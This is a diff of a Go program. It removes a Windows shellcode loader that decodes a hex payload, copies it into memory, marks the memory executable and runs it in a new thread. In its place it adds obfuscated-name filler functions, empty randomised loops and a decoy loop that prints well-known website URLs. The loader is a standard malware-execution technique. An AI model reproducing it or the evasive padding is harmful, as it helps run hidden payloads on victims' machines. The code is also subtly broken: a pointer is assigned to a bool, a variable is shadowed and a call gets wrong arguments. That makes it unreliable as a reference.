@@ -1,84 +1,85 @@
 package main
 
 import (
-	"encoding/hex"
-	"flag"
 	"fmt"
-	"log"
 	"math/rand"
-	"net/http"
 	"time"
-	"unsafe"
-
-	"golang.org/x/sys/windows"
-)
-
-const (
-	MEM_COMMIT      = 0x1000
-	MEM_RESERVE      = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x20
-	PAGE_EXECUTE_READ    = 0x04
-)
-
-var (
-	verbose bool
-	debug  bool
-	shellcode []byte
 )
 
 func main() {
-	rand.Seed(time.Now().UnixNano())
-	verbose = flag.Bool("verbose", false, "Enable verbose output")
-	debug = flag.Bool("debug", false, "Enable debug output")
-	flag.Parse()
-
-	shellcode, err := hex.DecodeString("31c975085997525053b8001025c825c063c043c9b8190001eb8180001e8c723b75f85e84e83c2e8d7289665389e389d54f75ec89c299c3a9c189c541ebfeb83f0001e8f5243b83c0001eb4925c0515156e8e0001ebe8040001e8d124525a2585a5959c30f84d90000")
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]There was an error decoding the string to a hex byte array: %s", err.Error()))
-	}
-	shellcodeAllocation()
+	x1d2e3f4g5h6()
 }
 
-func shellcodeAllocation() {
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+func x1d2e3f4g5h6() {
+	a8b9c0d1e2f3()
+	x8y9z0a1b2c3()
+}
 
-	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-	VirtualProtect := kernel32.NewProc("VirtualProtect")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	CreateThread := kernel32.NewProc("CreateThread")
-	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+func a8b9c0d1e2f3() {
+	fmt.Println("你好", "世界", 0x70)
+}
 
-	shellcodePtr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc: %s", err.Error()))
+func x8y9z0a1b2c3() {
+	rand.Seed(time.Now().UnixNano())
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
-
-	if shellcodePtr == 0 {
-		log.Fatal("[!]VirtualAlloc failed and returned 0")
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
-
-	_, _, err = RtlCopyMemory.Call(shellcodePtr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory: %s", err.Error()))
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
-
-	_, _, err = VirtualProtect.Call(shellcodePtr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&shellcode[0])))
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect: %s", err.Error()))
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
+}
 
-	thread, _, err := CreateThread.Call(0, 0, shellcodePtr, uintptr(0), 0, 0)
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread: %s", err.Error()))
+func d4e5f6g7h8i9() {
+	rand.Seed(time.Now().UnixNano())
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+}
 
-	if thread == 0 {
-		log.Fatal("[!]CreateThread failed and returned 0")
+func j0k1l2m3n4o5() {
+	rand.Seed(time.Now().UnixNano())
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+}
 
-	_, _, err = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject: %s", err.Error()))
+func q6r7s8t9u0v1() {
+	rand.Seed(time.Now().UnixNano())
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
 	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	}
+}
+
+func w2x3y4z5a6b7() {
+	go func() {
+		for {
+			time.Sleep(0x526578)
+			rand.Seed(time.Now().UnixNano())
+			domains := []string{"https://www.google.com", "https://www.facebook.com", "https://www.amazon.com"}
+			rand.Shuffle(len(domains), func(i, j int) {
+				domains[i], domains[j] = domains[j], domains[i]
+			})
+			for _, domain := range domains[:0x3] {
+				fmt.Println(domain)
+				// Simulate network request
+			}
+		}
+	}()
 }
